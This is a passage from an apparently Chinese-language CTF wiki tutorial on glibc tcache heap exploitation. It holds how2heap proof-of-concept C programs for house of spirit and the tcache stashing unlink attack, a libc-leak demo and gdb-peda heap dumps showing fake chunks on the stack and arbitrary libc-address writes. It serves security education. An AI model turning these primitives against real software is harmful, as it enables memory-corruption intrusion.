    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;It works in a similar way to original house of spirit but you don&#39;t need to create fake chunk after the fake chunk that will be freed.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#39;s size and prev_inuse are sane.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;(Search for strings </span><span class="se">\&quot;</span><span class="s">invalid next size</span><span class="se">\&quot;</span><span class="s"> and </span><span class="se">\&quot;</span><span class="s">double free or corruption</span><span class="se">\&quot;</span><span class="s">)</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Ok. Let&#39;s start with the example!.</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>


    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Calling malloc() once so that it sets up its memory.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Let&#39;s imagine we will overwrite 1 pointer to point to a fake chunk region.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">a</span><span class="p">;</span> <span class="c1">//pointer that will be overwritten</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span> <span class="c1">//fake chunk region</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This region contains one fake chunk. It&#39;s size field is placed at %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x40</span><span class="p">;</span> <span class="c1">// this is the size</span>


    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="n">a</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Freeing the overwritten pointer.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;malloc(0x30): %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div>
<p>攻击之后的目的是，去控制栈上的内容，malloc 一块 chunk ，然后我们通过在栈上 fake 的chunk，然后去 free 掉他，我们会发现</p>
<div class="highlight"><pre><span></span><code>gdb-peda$ heapinfo
<span class="o">(</span>0x20<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">0</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x30<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">1</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x40<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">2</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x50<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">3</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x60<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">4</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x70<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">5</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x80<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">6</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x90<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">7</span><span class="o">]</span>: 0x0
<span class="o">(</span>0xa0<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">8</span><span class="o">]</span>: 0x0
<span class="o">(</span>0xb0<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">9</span><span class="o">]</span>: 0x0
                  top: 0x4052e0 <span class="o">(</span>size : 0x20d20<span class="o">)</span>
       last_remainder: 0x0 <span class="o">(</span>size : 0x0<span class="o">)</span>
            unsortbin: 0x0
<span class="o">(</span>0x90<span class="o">)</span>   tcache_entry<span class="o">[</span><span class="m">7</span><span class="o">]</span>: 0x7fffffffe510 --&gt; 0x401340
</code></pre></div>
<p>Tcache 里就存放了一块 栈上的内容，我们之后只需 malloc，就可以控制这块内存。</p>
<h4 id="smallbin-unlink">smallbin unlink<a class="headerlink" href="#smallbin-unlink" title="Permanent link">&para;</a></h4>
<p>在smallbin中包含有空闲块的时候，会同时将同大小的其他空闲块，放入tcache中，此时也会出现解链操作，但相比于unlink宏，缺少了链完整性校验。因此，原本unlink操作在该条件下也可以使用。</p>
<h4 id="tcache-stashing-unlink-attack">tcache stashing unlink attack<a class="headerlink" href="#tcache-stashing-unlink-attack" title="Permanent link">&para;</a></h4>
<p>这种攻击利用的是 tcache bin 有剩余(数量小于 <code>TCACHE_MAX_BINS</code> )时，同大小的small bin会放进tcache中(这种情况可以用  <code>calloc</code> 分配同大小堆块触发，因为 <code>calloc</code> 分配堆块时不从 tcache bin 中选取)。在获取到一个 <code>smallbin</code> 中的一个chunk后会如果 tcache 仍有足够空闲位置，会将剩余的 small bin 链入 tcache ，在这个过程中只对第一个 bin 进行了完整性检查，后面的堆块的检查缺失。当攻击者可以写一个small bin的bk指针时，其可以在任意地址上写一个libc地址(类似 <code>unsorted bin attack</code> 的效果)。构造得当的情况下也可以分配 fake chunk 到任意地址。</p>
<p>这里以 <code>how2heap</code> 中的 <code>tcache_stashing_unlink_attack.c</code> 为例。</p>
<p>我们按照释放的先后顺序称 <code>smallbin[sz]</code> 中的两个 chunk 分别为 chunk0 和 chunk1。我们修改 chunk1 的 <code>bk</code> 为 <code>fake_chunk_addr</code>。同时还要在 <code>fake_chunk_addr-&gt;bk</code> 处提前写一个可写地址 <code>writable_addr</code> 。调用 <code>calloc(size-0x10)</code> 的时候会返回给用户 chunk0 (这是因为 smallbin 的 <code>FIFO</code> 分配机制)，假设 <code>tcache[sz]</code> 中有 5 个空闲堆块，则有足够的位置容纳 <code>chunk1</code> 以及 <code>fake_chunk</code> 。在源码的检查中，只对第一个 chunk 的链表完整性做了检测 <code>__glibc_unlikely (bck-&gt;fd != victim)</code> ，后续堆块在放入过程中并没有检测。</p>
<p>因为tcache的分配机制是 <code>LIFO</code> ，所以位于 <code>fake_chunk-&gt;bk</code> 指针处的 <code>fake_chunk</code> 在链入 tcache 的时候反而会放到链表表头。在下一次调用 <code>malloc(sz-0x10)</code> 时会返回 <code>fake_chunk+0x10</code> 给用户，同时，由于 <code>bin-&gt;bk = bck;bck-&gt;fd = bin;</code> 的unlink操作，会使得 <code>writable_addr+0x10</code> 处被写入一个 libc 地址。</p>
<div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">stack_var</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">chunk_lis</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">target</span><span class="p">;</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This file demonstrates the stashing unlink attack on tcache.</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This poc has been tested on both glibc 2.27 and glibc 2.29.</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#39;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#39;ll create the chunk on the stack.</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="c1">// stack_var emulate the fake_chunk we want to alloc to</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Stack_var emulates the fake chunk we want to alloc to.</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;First let&#39;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="n">stack_var</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">stack_var</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;You can see the value of fake_chunk-&gt;bk is:%p</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">stack_var</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Also, let&#39;s see the initial value of stack_var[4]:%p</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">stack_var</span><span class="p">[</span><span class="mi">4</span><span class="p">]);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now we alloc 9 chunks with malloc.</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="c1">//now we malloc 9 chunks</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">9</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">chunk_lis</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">//put 7 tcache</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#39;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">9</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">free</span><span class="p">(</span><span class="n">chunk_lis</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    <span class="p">}</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="c1">//last tcache bin</span>
    <span class="n">free</span><span class="p">(</span><span class="n">chunk_lis</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="c1">//now they are put into unsorted bin</span>
    <span class="n">free</span><span class="p">(</span><span class="n">chunk_lis</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">chunk_lis</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>

    <span class="c1">//convert into small bin</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="n">malloc</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">);</span><span class="c1">//&gt;0x90</span>

    <span class="c1">//now 5 tcache bins</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">stack_var</span><span class="p">);</span>

    <span class="c1">//change victim-&gt;bck</span>
    <span class="cm">/*VULNERABILITY*/</span>
    <span class="n">chunk_lis</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">stack_var</span><span class="p">;</span>
    <span class="cm">/*VULNERABILITY*/</span>

    <span class="c1">//trigger the attack</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x90</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">stack_var</span><span class="p">[</span><span class="mi">2</span><span class="p">],(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">stack_var</span><span class="p">[</span><span class="mi">4</span><span class="p">]);</span>

    <span class="c1">//malloc and return our fake chunk on stack</span>
    <span class="n">target</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span>   

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">target</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<p>这个 poc 用栈上的一个数组上模拟 <code>fake_chunk</code> 。首先构造出5个 <code>tcache chunk</code> 和2个 <code>smallbin chunk</code> 的情况。模拟 <code>UAF</code> 漏洞修改 <code>bin2-&gt;bk</code> 为 <code>fake_chunk</code> ，在 <code>calloc(0x90)</code> 的时候触发攻击。</p>
<p>我们在 <code>calloc</code> 处下断点，调用前查看堆块排布情况。此时 <code>tcache[0xa0]</code> 中有 5 个空闲块。可以看到 chunk1-&gt;bk 已经被改为了 <code>fake_chunk_addr</code> 。而 <code>fake_chunk-&gt;bk</code> 也写上了一个可写地址。由于 <code>smallbin</code> 是按照 <code>bk</code> 指针寻块的，分配得到的顺序应当是 <code>0x0000000000603250-&gt;0x0000000000603390-&gt;0x00007fffffffdbc0 (FIFO)</code> 。调用 calloc 会返回给用户 <code>0x0000000000603250+0x10</code>。</p>
<div class="highlight"><pre><span></span><code>gdb-peda$ heapinfo
<span class="o">(</span>0x20<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">0</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x30<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">1</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x40<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">2</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x50<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">3</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x60<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">4</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x70<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">5</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x80<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">6</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x90<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">7</span><span class="o">]</span>: 0x0
<span class="o">(</span>0xa0<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">8</span><span class="o">]</span>: 0x0
<span class="o">(</span>0xb0<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">9</span><span class="o">]</span>: 0x0
                  top: 0x6038a0 <span class="o">(</span>size : 0x20760<span class="o">)</span> 
       last_remainder: 0x0 <span class="o">(</span>size : 0x0<span class="o">)</span> 
            unsortbin: 0x0
<span class="o">(</span>0x0a0<span class="o">)</span>  smallbin<span class="o">[</span> <span class="m">8</span><span class="o">]</span>: 0x603390 <span class="o">(</span>doubly linked list corruption 0x603390 !<span class="o">=</span> 0x0 and 0x603390 is broken<span class="o">)</span>
<span class="o">(</span>0xa0<span class="o">)</span>   tcache_entry<span class="o">[</span><span class="m">8</span><span class="o">](</span><span class="m">5</span><span class="o">)</span>: 0x6036c0 --&gt; 0x603620 --&gt; 0x603580 --&gt; 0x6034e0 --&gt; 0x603440
gdb-peda$ x/4gx 0x603390
0x603390:       0x0000000000000000      0x00000000000000a1
0x6033a0:       0x0000000000603250      0x00007fffffffdbc0
gdb-peda$ x/4gx 0x00007fffffffdbc0
0x7fffffffdbc0: 0x0000000000000000      0x0000000000000000
0x7fffffffdbd0: 0x0000000000000000      0x00007fffffffdbd0
gdb-peda$ x/4gx 0x0000000000603250
0x603250:       0x0000000000000000      0x00000000000000a1
0x603260:       0x00007ffff7dcfd30      0x0000000000603390
gdb-peda$ x/4gx 0x00007ffff7dcfd30
0x7ffff7dcfd30 &lt;main_arena+240&gt;:        0x00007ffff7dcfd20      0x00007ffff7dcfd20
0x7ffff7dcfd40 &lt;main_arena+256&gt;:        0x0000000000603390      0x0000000000603250
</code></pre></div>
<p>调用 calloc 后再查看堆块排布情况，可以看到 <code>fake_chunk</code> 已经被链入 <code>tcache_entry[8]</code> ,且因为分配顺序变成了 <code>LIFO</code> , <code>0x7fffffffdbd0-0x10</code> 这个块被提到了链表头，下次 <code>malloc(0x90)</code> 即可获得这个块。</p>
<p>其 fd 指向下一个空闲块，在 unlink 过程中 <code>bck-&gt;fd=bin</code> 的赋值操作使得 <code>0x00007fffffffdbd0+0x10</code> 处写入了一个 libc 地址。</p>
<div class="highlight"><pre><span></span><code>gdb-peda$ heapinfo
<span class="o">(</span>0x20<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">0</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x30<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">1</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x40<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">2</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x50<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">3</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x60<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">4</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x70<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">5</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x80<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">6</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x90<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">7</span><span class="o">]</span>: 0x0
<span class="o">(</span>0xa0<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">8</span><span class="o">]</span>: 0x0
<span class="o">(</span>0xb0<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">9</span><span class="o">]</span>: 0x0
                  top: 0x6038a0 <span class="o">(</span>size : 0x20760<span class="o">)</span> 
       last_remainder: 0x0 <span class="o">(</span>size : 0x0<span class="o">)</span> 
            unsortbin: 0x0
<span class="o">(</span>0x0a0<span class="o">)</span>  smallbin<span class="o">[</span> <span class="m">8</span><span class="o">]</span>: 0x603390 <span class="o">(</span>doubly linked list corruption 0x603390 !<span class="o">=</span> 0x6033a0 and 0x603390 is broken<span class="o">)</span>
<span class="o">(</span>0xa0<span class="o">)</span>   tcache_entry<span class="o">[</span><span class="m">8</span><span class="o">](</span><span class="m">7</span><span class="o">)</span>: 0x7fffffffdbd0 --&gt; 0x6033a0 --&gt; 0x6036c0 --&gt; 0x603620 --&gt; 0x603580 --&gt; 0x6034e0 --&gt; 0x603440
gdb-peda$ x/4gx 0x7fffffffdbd0
0x7fffffffdbd0: 0x00000000006033a0      0x00007fffffffdbd0
0x7fffffffdbe0: 0x00007ffff7dcfd30      0x0000000000000000
</code></pre></div>
<h4 id="libc-leak">libc leak<a class="headerlink" href="#libc-leak" title="Permanent link">&para;</a></h4>
<p>在以前的libc 版本中，我们只需这样：</p>
<div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">long</span> <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="p">}</span> 
</code></pre></div>
<p>但是在2.26 之后的 libc 版本后，我们首先得先把tcache 填满：</p>
<div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span> <span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="kt">long</span><span class="o">*</span> <span class="n">t</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span>
    <span class="kt">long</span> <span class="o">*</span><span class="n">a</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="kt">long</span> <span class="o">*</span><span class="n">b</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>

    <span class="c1">// make tcache bin full</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">7</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">7</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">free</span><span class="p">(</span><span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>

    <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
    <span class="c1">// a is put in an unsorted bin because the tcache bin of this size is full</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="p">}</span> 
</code></pre></div>
<p>之后，我们就可以 leak libc 了。</p>
<div class="highlight"><pre><span></span><code>gdb-peda$ heapinfo
<span class="o">(</span>0x20<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">0</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x30<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">1</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x40<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">2</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x50<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">3</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x60<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">4</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x70<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">5</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x80<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">6</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x90<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">7</span><span class="o">]</span>: 0x0
